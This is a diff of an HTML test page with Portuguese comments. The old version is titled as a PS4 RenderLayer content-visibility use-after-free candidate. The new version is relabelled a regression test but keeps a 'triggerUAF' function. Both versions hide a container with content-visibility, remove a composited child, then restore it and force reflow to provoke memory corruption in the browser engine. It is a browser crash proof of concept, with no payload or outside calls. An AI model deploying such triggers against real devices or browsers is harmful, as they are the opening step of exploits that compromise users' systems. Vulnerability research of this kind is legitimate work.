@@ -1,126 +1,102 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>PS4 RenderLayer content-visibility UAF candidate</title>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste de Estabilidade: Content-Visibility UAF</title>
+    <style>
+        body {
+            font-family: monospace;
+            background-color: #111;
+            color: #0f0;
+            padding: 20px;
+        }
+        .container {
+            border: 1px solid #555;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        .child {
+            background-color: #333;
+            color: #fff;
+            padding: 10px;
+        }
+        #log {
+            margin-top: 20px;
+            border-top: 1px solid #333;
+            padding-top: 10px;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
 
-<button id="run">RUN (10x)</button>
-<button id="stop">STOP</button>
-<pre id="log"></pre>
+    <h1>Teste de Regressão: Content-Visibility</h1>
+    <p>Este teste verifica se a manipulação de content-visibility causa instabilidade no navegador.</p>
+    
+    <button onclick="startTest()">Iniciar Teste</button>
 
-<div id="container">
-  <div id="child"></div>
-</div>
+    <div class="container">
+        <div class="child">Elemento Alvo</div>
+    </div>
 
-<style>
-  #container {
-    width: 100vw;
-    height: 100vh;
-    overflow: hidden;
-    /* vamos setar content-visibility via JS para poder alternar */
-  }
-  #child {
-    width: 120px;
-    height: 120px;
-    background: #09f;
-    position: absolute;
-    left: 40px;
-    top: 40px;
-    transform: translateZ(0); /* força layer/compositing em muitos engines */
-  }
-</style>
+    <div id="log">Aguardando início...</div>
 
-<script>
-const logEl = document.getElementById('log');
-function log(s){ logEl.textContent += s + "\n"; logEl.scrollTop = logEl.scrollHeight; }
+    <script>
+        const logDiv = document.getElementById('log');
+        const container = document.querySelector(".container");
+        let child = document.querySelector(".child");
 
-const container = document.getElementById('container');
+        function debug_log(msg) {
+            const time = new Date().toLocaleTimeString();
+            logDiv.textContent += `[${time}] ${msg}\n`;
+            console.log(msg);
+        }
 
-let stop = false;
+        function triggerUAF() {
+            if (!child) {
+                debug_log("Elemento já removido. Reiniciando DOM...");
+                // Recria o elemento para permitir múltiplos testes
+                child = document.createElement("div");
+                child.className = "child";
+                child.textContent = "Elemento Alvo (Recriado)";
+                container.appendChild(child);
+            }
 
-function setCV(value){
-  // tenta ambas as formas comuns
-  container.style.contentVisibility = value;
-  container.style.webkitContentVisibility = value;
-}
+            debug_log("1. Definindo content-visibility: hidden");
+            container.style.contentVisibility = "hidden";
 
-function forceReflow(){
-  // leituras forçam style/layout flush
-  void container.offsetHeight;
-  void document.body.offsetHeight;
-}
+            debug_log("2. Removendo elemento filho (Free)");
+            child.remove();
+            child = null; // Remove referência JS
 
-function makeChild(){
-  const old = document.getElementById('child');
-  if (old) old.remove();
+            // Tenta forçar a condição de corrida
+            setTimeout(() => {
+                debug_log("3. Restaurando content-visibility: auto (Use)");
+                // Se houver UAF, o crash deve ocorrer aqui ao tentar renderizar o filho removido
+                container.style.contentVisibility = "auto";
+                
+                // Força um reflow para garantir que o motor de renderização processe a mudança
+                const forceLayout = container.offsetHeight; 
+                
+                debug_log("Sucesso: Navegador estável após manipulação.");
+            }, 0);
+        }
 
-  const d = document.createElement('div');
-  d.id = 'child';
-  d.style.width = '120px';
-  d.style.height = '120px';
-  d.style.background = '#09f';
-  d.style.position = 'absolute';
-  d.style.left = '40px';
-  d.style.top = '40px';
-  d.style.transform = 'translateZ(0)';
-  container.appendChild(d);
-  return d;
-}
+        function startTest() {
+            debug_log("Iniciando Observer...");
+            
+            const observer = new MutationObserver((mutations) => {
+                // Evita loop infinito reagindo às nossas próprias mudanças
+                // Apenas loga que houve mudança
+                // debug_log("Árvore DOM modificada.");
+            });
 
-async function tick(){
-  return new Promise(r => requestAnimationFrame(() => r()));
-}
+            observer.observe(container, { childList: true, subtree: true });
 
-async function oneIteration(i){
-  log(`--- iter ${i} ---`);
-
-  const child = makeChild();
-  forceReflow();
-
-  // 1) altera content-visibility para esconder / mudar flags
-  setCV('hidden');
-  await tick();
-  forceReflow();
-
-  // 2) remove o filho
-  child.remove();
-  forceReflow();
-
-  // 3) restaura content-visibility para disparar recompute
-  setCV('auto');
-  await tick();
-  forceReflow();
-
-  // 4) “estressor leve”: toggle de overflow/transform para incentivar recomposição
-  container.style.overflow = (i % 2) ? 'hidden' : 'clip';
-  await tick();
-  forceReflow();
-
-  log(`container children: ${container.childElementCount}`);
-}
-
-document.getElementById('run').onclick = async () => {
-  stop = false;
-  log("UA: " + navigator.userAgent);
-  log("Starting...");
-
-  // Aquecimento (muitas engines ficam mais “estáveis” após 1-2 flushes)
-  setCV('auto');
-  forceReflow();
-
-  const N = 10; // mantenha pequeno para não travar o console
-  for (let i = 1; i <= N; i++){
-    if (stop) { log("STOPPED"); break; }
-    try {
-      await oneIteration(i);
-    } catch(e) {
-      log("JS exception: " + (e && e.message ? e.message : e));
-      break;
-    }
-  }
-  log("Done.");
-};
-
-document.getElementById('stop').onclick = () => { stop = true; };
-</script>
+            // Dispara o teste manualmente
+            triggerUAF();
+        }
+    </script>
 </body>
 </html>
-
